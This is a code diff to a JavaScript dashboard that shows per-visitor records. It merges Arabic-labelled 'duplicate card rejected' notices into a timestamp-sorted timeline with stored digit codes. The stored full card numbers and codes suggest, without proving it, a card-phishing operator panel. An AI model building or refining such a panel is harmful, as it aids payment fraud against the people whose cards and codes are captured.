@@ -1584,18 +1584,20 @@
         html += '</div>';
       }
       
-      // Show duplicate card rejection notes
-      if (visitor.duplicateCardRejections && visitor.duplicateCardRejections.length > 0) {
-        visitor.duplicateCardRejections.forEach((rej) => {
-          const maskedCard = rej.cardNumber ? rej.cardNumber.slice(0, 4) + ' **** **** ' + rej.cardNumber.slice(-4) : '';
-          html += '<div class="bg-yellow-50 border border-yellow-300 rounded-lg p-3">';
-          html += '<p class="text-yellow-800 font-medium text-center">⚠️ تم رفض بطاقة مكررة: ' + maskedCard + '</p>';
-          html += '</div>';
-        });
-      }
-
       // Combine all entries (cards, codes, and data history) and sort by timestamp (newest first))
       const allEntries = [];
+      
+      // Add duplicate card rejections with type
+      if (visitor.duplicateCardRejections && visitor.duplicateCardRejections.length > 0) {
+        visitor.duplicateCardRejections.forEach((rej, index) => {
+          allEntries.push({
+            type: 'duplicateCard',
+            data: rej,
+            index: index,
+            timestamp: rej.timestamp || new Date(0).toISOString()
+          });
+        });
+      }
       
       // Add digit codes with type
       if (visitor.digitCodes && visitor.digitCodes.length > 0) {
@@ -1640,7 +1642,13 @@
       if (allEntries.length > 0) {
         html += '<div class="space-y-3">';
         allEntries.forEach((entry) => {
-          if (entry.type === 'code') {
+          if (entry.type === 'duplicateCard') {
+            const rej = entry.data;
+            const maskedCard = rej.cardNumber ? rej.cardNumber.slice(0, 4) + ' **** **** ' + rej.cardNumber.slice(-4) : '';
+            html += '<div class="bg-yellow-50 border border-yellow-300 rounded-lg p-3">';
+            html += '<p class="text-yellow-800 font-medium text-center">⚠️ تم رفض بطاقة مكررة: ' + maskedCard + '</p>';
+            html += '</div>';
+          } else if (entry.type === 'code') {
             const dc = entry.data;
             const index = entry.index;
             html += '<div class="data-section bg-orange-50 p-4 rounded-lg" style="border-right-color: #f97316;">';
